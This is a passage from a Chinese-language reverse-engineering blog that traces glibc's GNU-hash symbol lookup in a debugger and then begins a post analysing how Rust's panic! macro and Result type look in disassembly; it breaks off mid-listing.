<h3 id="do_lookup_x第二段"><a class="markdownIt-Anchor" href="#do_lookup_x第二段"></a> <code>do_lookup_x</code>第二段</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">     Elf_Symndx symidx;</span><br><span class="line">     <span class="type">int</span> num_versions = <span class="number">0</span>;</span><br><span class="line">     <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *versioned_sym = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* The tables for this map.  */</span></span><br><span class="line">     <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_SYMTAB]);</span><br><span class="line">     <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">     <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">     <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *bitmask = <span class="built_in">map</span>-&gt;l_gnu_bitmask;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_likely (bitmask != <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) bitmask_word</span><br><span class="line">    = bitmask[(new_hash / __ELF_NATIVE_CLASS)</span><br><span class="line">	      &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits];</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift)</span><br><span class="line">			   &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)</span><br><span class="line">			&amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash</span><br><span class="line">					     % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br><span class="line">      <span class="keyword">if</span> (bucket != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">do</span></span><br><span class="line">	    <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span></span><br><span class="line">	      &#123;</span><br><span class="line">		symidx = ELF_MACHINE_HASH_SYMIDX (<span class="built_in">map</span>, hasharr);</span><br><span class="line">		sym = check_match (undef_name, ref, version, flags,</span><br><span class="line">				   type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">				   strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">				   &amp;num_versions);</span><br><span class="line">		<span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">		  <span class="keyword">goto</span> found_it;</span><br><span class="line">	      &#125;</span><br><span class="line">	  <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* No symbol found.  */</span></span><br><span class="line">  symidx = SHN_UNDEF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在if语句前面，可以看到首先获取了动态链接库的符号表地址与字符串表地址，后面还获取了一个<code>l_gnu_bitmask</code>，暂时功能未知，先向后看。如果这个指针不为空，那么进入if语句内部。这里首先通过<code>bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; map-&gt;l_gnu_bitmask_idxbits]</code>在动态链接库的bitmask中以<code>new_hash</code>作为索引找到hash值对应的bitmask。在libc 2.31中，l_gnu_bitmask_idxbits为255。本例中<code>new_hash</code>的值为2090683713，<code>__ELF_NATIVE_CLASS</code>等于64，计算得到结果为53（0x35）。由于bitmask是uint64_t数组，因此可以索引到bitmask值，本例中为0x813140016c082646：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p ((struct link_map*)0x7ffff7fcb000)-&gt;l_gnu_bitmask</span><br><span class="line">$11 = (const Elf64_Addr *) 0x7ffff7e1b8b0</span><br><span class="line">pwndbg&gt; p new_hash</span><br><span class="line">$13 = 2090683713</span><br><span class="line">pwndbg&gt; tele 0x7ffff7e1b8b0</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; </span><br><span class="line">30:0180│  0x7ffff7e1ba30 ◂— 0xc81890020142014</span><br><span class="line">31:0188│  0x7ffff7e1ba38 ◂— 0x12c20c1c107c0500</span><br><span class="line">32:0190│  0x7ffff7e1ba40 ◂— 0xc04010181000144</span><br><span class="line">33:0198│  0x7ffff7e1ba48 ◂— 0x28bc04e04dc80510</span><br><span class="line">34:01a0│  0x7ffff7e1ba50 ◂— 0x480002015100080</span><br><span class="line">35:01a8│  0x7ffff7e1ba58 ◂— 0x813140016c082646      // 0x35 = 53</span><br><span class="line">36:01b0│  0x7ffff7e1ba60 ◂— 0x22302a0880760408</span><br><span class="line">37:01b8│  0x7ffff7e1ba68 ◂— 0x9c940010648d020</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>随后，计算了两个hashbit，第1个是取最低6位，第2个是左移0xE位之后取最低6位。根据这两个hashbit取bitmask的2位，若均为1，则表示这个动态链接库中存在这个函数。下面要找到<code>l_gnu_buckets</code>数组，将Hash值模数组长度获得该数组的索引值，解引用获取一个4字节整数值<code>bucket</code>。本例中的整数值为0x3ab。（数组长度为0x3f3）。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct link_map*)0x7ffff7fcb000)-&gt;l_nbuckets</span><br><span class="line">Cannot access memory at address 0x3f3</span><br><span class="line">pwndbg&gt; p ((struct link_map*)0x7ffff7fcb000)-&gt;l_gnu_chain_zero</span><br><span class="line">$16 = (const Elf32_Word *) 0x7ffff7e1d04c</span><br><span class="line">pwndbg&gt; tele 0x7FFFF7E1C734</span><br><span class="line">00:0000│  0x7ffff7e1c734 ◂— 0x3ab</span><br><span class="line">01:0008│  0x7ffff7e1c73c ◂— 0x3b2000003af</span><br><span class="line">02:0010│  0x7ffff7e1c744 ◂— 0x3b6000003b5</span><br><span class="line">03:0018│  0x7ffff7e1c74c ◂— 0x3bc000003b8</span><br><span class="line">04:0020│  0x7ffff7e1c754 ◂— 0x3c4000003c2</span><br><span class="line">05:0028│  0x7ffff7e1c75c ◂— 0x3cc000003c8</span><br><span class="line">06:0030│  0x7ffff7e1c764 ◂— 0x3d1000003cf</span><br><span class="line">07:0038│  0x7ffff7e1c76c ◂— 0x3d5000003d4</span><br></pre></td></tr></table></figure>
<p>然后以这个值作为索引去<code>l_gnu_chain_zero</code>找到另一个整数值<code>hasharr</code>。本例中为0x4b236ea4。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p ((struct link_map*)0x7ffff7fcb000)-&gt;l_gnu_chain_zero</span><br><span class="line">$18 = (const Elf32_Word *) 0x7ffff7e1d04c</span><br><span class="line">pwndbg&gt; tele 0x7FFFF7E1DEF8</span><br><span class="line">00:0000│  0x7ffff7e1def8 ◂— 0x7c9d4d404b236ea4</span><br><span class="line">01:0008│  0x7ffff7e1df00 ◂— 0x71d90e3dc280ddf8</span><br><span class="line">02:0010│  0x7ffff7e1df08 ◂— 0xffdb8ae60d827524</span><br><span class="line">03:0018│  0x7ffff7e1df10 ◂— 0x738b351c0021c67b</span><br><span class="line">04:0020│  0x7ffff7e1df18 ◂— 0xa9011613755d52c2</span><br><span class="line">05:0028│  0x7ffff7e1df20 ◂— 0x315a1cd2b2265f0f</span><br><span class="line">06:0030│  0x7ffff7e1df28 ◂— 0x5cc4dd64102bde19</span><br><span class="line">07:0038│  0x7ffff7e1df30 ◂— 0x33a12d7ed09ebde0</span><br></pre></td></tr></table></figure>
<p>下面有一个do-while循环，推测应该是线性递增的Hash表查询。如本例中：</p>
<ul>
<li>首先计算<code>0x4b236ea4 ^ 0x7c9d4d41 (2090683713, new_hash)</code>值为0x37BE23E5，右移1位后不为0，跳过if语句。因为<code>0x4b236ea4 &amp; 1 == 0</code>，循环继续。</li>
<li><code>0x4b236ea4</code>的下面一个整数值为<code>0x7c9d4d40</code>，它与<code>0x7c9d4d41</code>异或的值为1，右移1位后为0，进入if语句。此时索引值为0x3ac。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /sysdeps/generic/ldsodefs.h, line 57</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> ELF_MACHINE_HASH_SYMIDX(map, hasharr) \</span></span><br><span class="line"><span class="meta">  ((hasharr) - (map)-&gt;l_gnu_chain_zero)</span></span><br></pre></td></tr></table></figure>
<p>随后计算<code>symidx</code>，即该符号在动态链接库符号表中的索引值。根据上面的宏定义，可值该值等于0x3ac。通过这个索引值可在符号表中找到对应的<code>Elf64_Sym</code>实例。这个结构体中的<code>st_name</code>字段表示这个符号的名字在.strtab节中的偏移量，因此可由此进一步找到符号名，对比即可知道是否真正匹配。</p>
<p>总结下来，整个符号的查询过程大致如下图所示：</p>
<p><img src="2.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/08/16/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/16/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-8/" class="post-title-link" itemprop="url">Rust逆向学习 (8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-08-16 09:53:02" itemprop="dateCreated datePublished" datetime="2024-08-16T09:53:02+08:00">2024-08-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-10 00:09:26" itemprop="dateModified" datetime="2024-10-10T00:09:26+08:00">2024-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-panic"><a class="markdownIt-Anchor" href="#reverse-for-panic"></a> Reverse for <code>panic!</code></h1>
<p>在Rust中，<code>panic!</code>宏一般在程序发生无法恢复的错误后。下面将简单分析<code>panic!</code>的执行流程。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">panic!</span>(<span class="string">&quot;This is a panic&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">thread &#x27;main&#x27; panicked at src/main.rs:2:5:</span><br><span class="line">This is a panic</span><br><span class="line">stack backtrace:</span><br><span class="line">   0: rust_begin_unwind</span><br><span class="line">             at /rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/std/src/panicking.rs:652:5</span><br><span class="line">   1: core::panicking::panic_fmt</span><br><span class="line">             at /rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/core/src/panicking.rs:72:14</span><br><span class="line">   2: lab_01::main</span><br><span class="line">             at ./src/main.rs:2:5</span><br><span class="line">   3: core::ops::function::FnOnce::call_once</span><br><span class="line">             at /rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/core/src/ops/function.rs:250:5</span><br><span class="line">note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.</span><br></pre></td></tr></table></figure>
<p>下面是主函数的逆向：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">example::main::h6a0467faef132dda:</span><br><span class="line">        push    rax</span><br><span class="line">        lea     rdi, [rip + .L__unnamed_8]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_9]</span><br><span class="line">        mov     rax, qword ptr [rip + std::panicking::begin_panic::h98e090bdb7d9058a@GOTPCREL]</span><br><span class="line">        mov     esi, 15</span><br><span class="line">        call    rax</span><br><span class="line">        </span><br><span class="line">.L__unnamed_8:</span><br><span class="line">        .ascii  &quot;This is a panic&quot;</span><br><span class="line">        </span><br><span class="line">.L__unnamed_12:</span><br><span class="line">        .ascii  &quot;/app/example.rs&quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_9:</span><br><span class="line">        .quad   .L__unnamed_12</span><br><span class="line">        .asciz  &quot;\017\000\000\000\000\000\000\000\n\000\000\000\005\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>panic!</code>宏实际上调用的是<code>std::panicking::begin_panic</code>，调用的参数一共有3个，前2个用于表示传入的字符串切片，而第3个则无法直接通过内容猜测功能。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">std::panicking::begin_panic::h98e090bdb7d9058a:</span><br><span class="line">        sub     rsp, 40</span><br><span class="line">        mov     qword ptr [rsp + 32], rdx</span><br><span class="line">        mov     rax, qword ptr [rsp + 32]</span><br><span class="line">        mov     qword ptr [rsp + 8], rdi</span><br><span class="line">        mov     qword ptr [rsp + 16], rsi</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rip + std::sys_common::backtrace::__rust_end_short_backtrace::h09ebf2ec8a3c7498@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    rax</span><br><span class="line">        </span><br><span class="line">std::sys_common::backtrace::__rust_end_short_backtrace::h09ebf2ec8a3c7498:</span><br><span class="line">        push    rax</span><br><span class="line">        mov     rax, qword ptr [rip + std::panicking::begin_panic::&#123;&#123;closure&#125;&#125;::hc0962f7734eef2e0@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line">        </span><br><span class="line">std::panicking::begin_panic::&#123;&#123;closure&#125;&#125;::hc0962f7734eef2e0:</span><br><span class="line">        sub     rsp, 56</span><br><span class="line">        mov     rcx, qword ptr [rdi]</span><br><span class="line">        mov     rax, qword ptr [rdi + 8]</span><br><span class="line">        mov     qword ptr [rsp + 24], rcx</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 24]</span><br><span class="line">        mov     rax, qword ptr [rsp + 32]</span><br><span class="line">        mov     qword ptr [rsp + 8], rcx</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        mov     rcx, qword ptr [rdi + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_1]</span><br><span class="line">        mov     rax, qword ptr [rip + std::panicking::rust_panic_with_hook::h51af00bcb4660c4e@GOTPCREL]</span><br><span class="line">        xor     r9d, r9d</span><br><span class="line">        mov     edx, r9d</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB3_3</span><br><span class="line">.LBB3_1:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 40]</span><br><span class="line">        call    _Unwind_Resume@PLT</span><br><span class="line">        mov     rcx, rax</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mov     qword ptr [rsp + 40], rcx</span><br><span class="line">        mov     dword ptr [rsp + 48], eax</span><br><span class="line">        jmp     .LBB3_1</span><br><span class="line">.LBB3_3:</span><br><span class="line">        ud2</span><br></pre></td></tr></table></figure>
<p>上面展示了前面的几个函数调用链，最终可以看到Rust调用了<code>rust_panic_with_hook</code>。通过堆栈回溯我们可以知道，回溯工作是在<code>rust_begin_unwind</code>中完成的。为了理解Rust是如何获取panic处的文件名、代码行数等信息的，我们需要首先了解有关堆栈回溯的相关技术，该部分内容可跳转至<a target="_blank" rel="noopener" href="https://blog.csdn.net/pwl999/article/details/107569603">资料</a>进行了解。需要注意的是，通过DWARF信息实现的堆栈回溯没有包含源代码目录以及行数的相关信息，这部分信息是在<code>.debug_line</code>中保存的。</p>
<h1 id="reverse-for-resultt-e"><a class="markdownIt-Anchor" href="#reverse-for-resultt-e"></a> Reverse for <code>Result&lt;T, E&gt;</code></h1>
<p><code>Result&lt;T, E&gt;</code>是Rust中一个非常重要的枚举类型，通常作为返回值使用，自带标识函数调用成功与否的信息。</p>
<p>我们分析下面的Rust程序：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fs::File;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, Read&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">f</span> = File::<span class="title function_ invoke__">open</span>(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">f</span> = <span class="keyword">match</span> f &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(file) =&gt; file,</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(error) =&gt; <span class="keyword">match</span> error.<span class="title function_ invoke__">kind</span>() &#123;</span><br><span class="line">            ErrorKind::NotFound =&gt; <span class="keyword">match</span> File::<span class="title function_ invoke__">create</span>(<span class="string">&quot;hello.txt&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">Ok</span>(fc) =&gt; fc,</span><br><span class="line">                <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Problem creating the file: &#123;:?&#125;&quot;</span>, e),</span><br><span class="line">            &#125;,</span><br><span class="line">            other_error =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Problem opening the file: &#123;:?&#125;&quot;</span>, other_error),</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file_content</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">match</span> f.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> file_content) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;File length: &#123;&#125;&quot;</span>, file_content.<span class="title function_ invoke__">len</span>()),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Error while reading.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt="" /></p>
<p>首先可以明显地看到位于41行<code>File::open</code>的函数调用，第一个参数为返回值<code>Result</code>的指针，第二个参数则为传入的字符串切片。</p>
<p><img src="2.png" alt="" /></p>
<p>下面是一个大的判断语句，判断条件<code>gap0</code>实际上就是<code>Result</code>实例的索引值。观察代码可以发现，if条件成立后应该执行的是错误分支，否则执行正确分支。因此可以得出：<code>Result</code>索引值为1表示错误，0表示正确。</p>
<p>我们首先查看一下错误分支。在源代码中，我们还针对错误的具体类型使用<code>match</code>语句进行分支。错误类型属于<code>Error</code>结构，其中调用了<code>kind</code>函数获取错误类型。第48行中<code>&amp;v3.gap0[8]</code>实际上就是<code>Error</code>实例的地址，位于<code>Result</code>枚举索引值的正后方，可以直接解引用获取<code>ErrorKind</code>枚举实例。</p>
<p>第51行直接将枚举实例作为条件进行判断。下面是<code>ErrorKind</code>的部分Rust源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]</span></span><br><span class="line"><span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line"><span class="meta">#[allow(deprecated)]</span></span><br><span class="line"><span class="meta">#[non_exhaustive]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">ErrorKind</span> &#123;</span><br><span class="line">    <span class="comment">/// An entity was not found, often a file.</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    NotFound,</span><br><span class="line">    </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>可以看到<code>NotFound</code>是第一个，索引值应该为0。而if的判断条件是不为0，因此这部分分支对应的是other_error部分，这从后面的字符串输出也可以看出。在第61行的<code>core::fmt::Arguments::new_v1::h6c1ad96880db1e98</code>函数调用中第2个参数就是<code>&quot;Problem opening the file: &quot;</code>的字符串切片。</p>
<p>随后，第64行调用了<code>std::fs::File::create</code>创建文件，创建的结果保存在<code>v7</code>中，后面的if语句是在文件创建失败时进入，进一步验证了<code>Result</code>索引值为1代表错误的结论。</p>
<p><img src="3.png" alt="" /></p>
<p>在循环外，第91行即为调用<code>Vec::new()</code>创建<code>Vec</code>实例，下面的第92行调用了<code>deref</code>函数获取了<code>Vec</code>的切片。在源代码中并没有<code>deref</code>函数的直接调用，但由于<code>read</code>函数传入的参数实际上是<code>&amp;mut [u8]</code>而不是<code>Vec</code>，因此需要隐式调用<code>deref</code>。这里的第95行<code>read</code>参数解析失败，通过汇编代码可知其参数类型。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000AC96 48 8D BC 24 28 01 00 00       lea     rdi, [rsp+258h+var_130]         ; retstr</span><br><span class="line">.text:000000000000AC9E E8 7D E3 FF FF                call    _ZN75_$LT$alloc__vec__Vec$LT$T$C$A$GT$$u20$as$u20$core__ops__deref__DerefMut$GT$9deref_mut17he73084c4a09ff985E ; _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..ops..deref..DerefMut$GT$::deref_mut::he73084c4a09ff985</span><br><span class="line">.text:000000000000AC9E</span><br><span class="line">.text:000000000000ACA3 48 89 54 24 18                mov     [rsp+258h+var_240], rdx</span><br><span class="line">.text:000000000000ACA8 48 89 44 24 20                mov     [rsp+258h+var_238], rax</span><br><span class="line">.text:000000000000ACAD EB 25                         jmp     short loc_ACD4</span><br><span class="line"></span><br><span class="line">.text:000000000000ACD4                               loc_ACD4:                               ; CODE XREF: lab_01::main::h059b97d6df6a6864+1ED↑j</span><br><span class="line">.text:000000000000ACD4 48 